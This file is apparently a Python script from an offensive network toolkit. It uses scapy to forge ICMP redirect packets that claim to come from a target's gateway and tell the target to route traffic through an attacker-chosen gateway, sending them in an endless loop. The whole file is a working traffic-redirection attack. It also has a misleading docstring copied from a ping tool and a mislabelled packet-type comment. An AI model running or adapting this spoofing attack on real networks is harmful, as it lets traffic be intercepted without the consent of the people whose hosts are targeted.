#!/usr/bin/env python3

import logging
from time import sleep

import click

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import ICMP, IP, conf, sr1, L3RawSocket, send, UDP


@click.command()
@click.argument('target')
@click.argument('oldgw')
@click.argument('newgw')
@click.option('-i', 'interface', default=None, help='Wich interface to use (default: auto)')
@click.option('-c', 'count', default=0, help='How many packets send (default: infinit)')
#@click.option('-t', 'timeout', default=2, help='Timeout in seconds (default: 2)')
#@click.option('-w', 'wait', default=1, help='How many seconds between packets (default: 1)')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_icmp_redirect(target, oldgw, newgw, interface, count, verbose):
    """The classic ping tool that send ICMP echo requests.

    \b
    # habu.ping 8.8.8.8
    IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
    IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
    IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
    IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
    """

    if interface:
        conf.iface = interface

    conf.verb = False
    conf.L3socket=L3RawSocket

    layer3 = IP()
    layer3.src = oldgw
    layer3.dst = target
    #layer3.tos = 0
    #layer3.id = 1
    #layer3.flags = 0
    #layer3.frag = 0
    #layer3.ttl = 64
    #layer3.proto = 1 # icmp

    layer4 = ICMP()
    layer4.type = 5 # echo-request
    layer4.code = 1
    layer4.gw = newgw
    #layer4.id = 0
    #layer4.seq = 0

    pkt = layer3 / layer4 / IP(src=target, dst='0.0.0.0') / UDP()

    counter = 0

    while True:
        ans = sr1(pkt, timeout=2)
        #send(pkt) #ans = sr1(pkt, timeout=timeout)
        #print(pkt.show2())
        if ans:
            print(ans.show2())
        '''
        if ans:
            if verbose:
                ans.show()
            else:
                print(ans.summary())
            del(ans)
        else:
            print('Timeout')

        counter += 1

        if count != 0 and counter == count:
            break
        '''
        sleep(5)

    return True

if __name__ == '__main__':
    cmd_icmp_redirect()
